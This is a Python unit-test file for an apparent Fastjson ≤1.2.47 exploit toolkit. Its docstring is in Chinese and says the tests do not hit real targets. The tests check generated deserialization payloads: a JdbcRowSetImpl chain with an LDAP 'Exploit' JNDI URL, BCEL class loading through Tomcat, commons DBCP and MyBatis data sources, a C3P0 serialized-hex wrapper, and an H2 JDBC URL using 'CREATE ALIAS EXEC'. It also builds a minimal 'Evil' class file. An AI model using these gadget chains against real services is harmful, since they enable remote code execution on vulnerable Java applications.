"""Fastjson ≤1.2.47 payload 生成单测（不打真实目标）。"""

from __future__ import annotations

import base64
import json
import struct

from fastjson_toolkit.poc.v1_2_47.encode import (
    bcel_code_from_class_bytes,
    c3p0_user_overrides,
    ensure_bcel_code,
    to_hex_ascii,
)
from fastjson_toolkit.poc.v1_2_47.payloads import (
    build_c3p0_wrapper,
    build_h2_jdbc,
    build_jdbc_rowset,
    build_mybatis_bcel,
    build_payload,
)
from fastjson_toolkit.poc.v1_2_47.service import generate_poc_1247, list_gadgets
from fastjson_toolkit.poc import Poc1247GenerateOptions


def _minimal_class(name: str = "Evil") -> bytes:
    utf8 = name.encode("utf-8")
    cp = bytearray()
    cp += struct.pack(">H", 3)
    cp.append(1)
    cp += struct.pack(">H", len(utf8))
    cp += utf8
    cp.append(7)
    cp += struct.pack(">H", 1)
    body = bytearray()
    body += struct.pack(">IHH", 0xCAFEBABE, 0, 52)
    body += cp
    body += struct.pack(">HHH", 0x0021, 2, 0)
    body += struct.pack(">HHH", 0, 0, 0)
    body += struct.pack(">H", 0)
    return bytes(body)


def test_list_gadgets_covers_notes():
    ids = {g["id"] for g in list_gadgets()}
    assert ids >= {
        "jdbc_rowset",
        "bcel_tomcat_dbcp",
        "bcel_tomcat_dbcp2",
        "bcel_commons_dbcp",
        "bcel_commons_dbcp2",
        "c3p0_wrapper",
        "mybatis_bcel",
        "h2_jdbc",
    }


def test_jdbc_rowset_payload():
    p = build_jdbc_rowset("ldap://127.0.0.1:1389/Exploit")
    obj = json.loads(p)
    assert obj["x1"]["@type"] == "java.lang.Class"
    assert obj["x1"]["val"] == "com.sun.rowset.JdbcRowSetImpl"
    assert obj["x2"]["dataSourceName"].startswith("ldap://")


def test_bcel_encode_prefix_and_round_shape():
    raw = _minimal_class()
    code = bcel_code_from_class_bytes(raw)
    assert code.startswith("$$BCEL$$")
    assert ensure_bcel_code(code[8:]) == code


def test_bcel_tomcat_dbcp2_payload_has_ref():
    code = bcel_code_from_class_bytes(_minimal_class())
    p = build_payload("bcel_tomcat_dbcp2", bcel_code=code)
    obj = json.loads(p)
    assert obj["name"]["val"] == "org.apache.tomcat.dbcp.dbcp2.BasicDataSource"
    x3 = obj["x1"]["x2"]["x3"]
    assert x3["driverClassName"].startswith("$$BCEL$$")
    assert x3["$ref"] == "$.x1.x2.x3.connection"


def test_c3p0_hex_ascii():
    data = b"\xac\xed\x00\x05"
    assert to_hex_ascii(data) == "ACED0005"
    ov = c3p0_user_overrides(data)
    p = build_c3p0_wrapper(ov)
    obj = json.loads(p)
    assert obj["x2"]["userOverridesAsString"].startswith("HexAsciiSerializedMap:")


def test_mybatis_bcel_ref_shape():
    code = "$$BCEL$$abc"
    p = build_mybatis_bcel(code)
    obj = json.loads(p)
    assert obj["x1"]["val"].endswith("UnpooledDataSource")
    u = obj["x2"]["x3"]["u"]
    assert u["driver"] == "$$BCEL$$abc"
    assert u["$ref"] == "$.x2.x3.u.connection"


def test_h2_from_class_b64():
    b64 = base64.b64encode(_minimal_class()).decode()
    p = build_h2_jdbc(class_b64=b64)
    obj = json.loads(p)
    assert obj["x1"]["val"] == "org.h2.jdbcx.JdbcDataSource"
    assert obj["x2"]["c"]["url"].startswith("jdbc:h2:mem:")
    assert "CREATE ALIAS EXEC" in obj["x2"]["c"]["url"]
    assert obj["x3"]["$ref"] == "$.x2.c.connection"


def test_h2_json_key_and_currency():
    b64 = base64.b64encode(_minimal_class()).decode()
    key_p = build_h2_jdbc(class_b64=b64, trigger="json_key")
    assert '"$ref"' not in key_p
    assert "}:{}" in key_p
    assert "org.h2.jdbcx.JdbcDataSource" in key_p

    no_type = build_h2_jdbc(
        class_b64=b64, trigger="json_key", json_key_with_type=False
    )
    assert "com.alibaba.fastjson.JSONObject" not in no_type
    assert "}:{}" in no_type

    arr = build_h2_jdbc(class_b64=b64, trigger="json_key", json_key_as_array=True)
    assert "[{ " not in arr  # compact
    assert "[{" in arr

    cur = build_payload("h2_jdbc", class_b64=b64, getter_trigger="currency")
    obj = json.loads(cur)
    assert obj["x"]["@type"] == "java.util.Currency"
    assert obj["x"]["val"]["currency"]["xx"]["x3"]["$ref"] == "$.x2.c.connection"

    chains = build_payload(
        "h2_jdbc", class_b64=b64, getter_trigger="currency_json_key"
    )
    assert "java.util.Currency" in chains
    assert "}:{}" in chains
    assert '"$ref"' not in chains


def test_mybatis_json_key_trigger():
    p = build_payload("mybatis_bcel", bcel_code="$$BCEL$$abc", getter_trigger="json_key")
    assert "}:{}" in p
    assert "UnpooledDataSource" in p


def test_generate_service():
    r = generate_poc_1247(Poc1247GenerateOptions(gadget="jdbc_rowset"))
    assert r.ok
    assert "JdbcRowSetImpl" in r.payload
    assert r.requires
    assert r.getter_trigger == "ref"

    r2 = generate_poc_1247(
        Poc1247GenerateOptions(gadget="jdbc_rowset", getter_trigger="currency")
    )
    assert r2.getter_trigger == "currency"
    assert "java.util.Currency" in r2.payload
